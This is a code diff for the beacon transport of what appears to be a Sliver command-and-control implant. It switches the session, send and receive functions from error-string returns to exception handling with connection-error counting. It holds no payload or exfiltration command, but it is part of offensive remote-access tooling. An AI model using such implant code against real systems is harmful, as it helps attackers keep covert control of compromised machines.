@@ -13,51 +13,56 @@ namespace transports {
 		return;
 	}
 	bool Beacon::BeaconInit() {
-		string error = "";
-		auto ret = this->client->SessionInit(error);
-		if (!ret) {
+		try {
+			return this->client->SessionInit();
+		}
+		catch (std::exception& e) {
+			cout << e.what() << endl;
 			std::unique_lock lk{ this->m };
 			this->connectionErrors += 1;
 		}
-		return ret;
+		return false;
 	}
 
 	bool Beacon::BeaconSend(sliverpb::Envelope& envelope) {
-		string error = "";
-		auto ret = this->client->WriteEnvelopeNoResp(envelope,error);
-		if (!ret) {
-#ifdef DEBUG
-			cout << error << endl;
-#endif
+		try
+		{
+			return this->client->WriteEnvelopeNoResp(envelope);
+		}
+		catch (const std::exception& e)
+		{
+			cout << e.what() << endl;
 			std::unique_lock lk{ this->m };
 			this->connectionErrors += 1;
 		}
-		return ret;
+		return false;
 	}
 
 	unique_ptr<sliverpb::Envelope> Beacon::BeaconRecv() {
-		string error = "";
-		auto ret = this->client->ReadEnvelope(error);
-		if (ret == nullptr) {
-#ifdef DEBUG
-			cout << error << endl;
-#endif
+		try
+		{
+			return this->client->ReadEnvelope();
+		}
+		catch (const std::exception& e)
+		{
+			cout << e.what() << endl;
 			std::unique_lock lk{ this->m };
 			this->connectionErrors += 1;
 		}
-		return ret;
+		return nullptr;
 	}
 	bool Beacon::BeaconRecv(const sliverpb::Envelope& to_send, sliverpb::Envelope& resp) {
-		string error = "";
-		auto ret = this->client->WriteAndReceive(to_send, resp,error);
-		if (!ret) {
-#ifdef DEBUG
-			cout << error << endl;
-#endif
+		try
+		{
+			return this->client->WriteAndReceive(to_send, resp);
+		}
+		catch (const std::exception& e)
+		{
+			cout << e.what() << endl;
 			std::unique_lock lk{ this->m };
 			this->connectionErrors += 1;
+			return false;
 		}
-		return ret;
 	}
 	
 	std::chrono::seconds Beacon::Duration() {
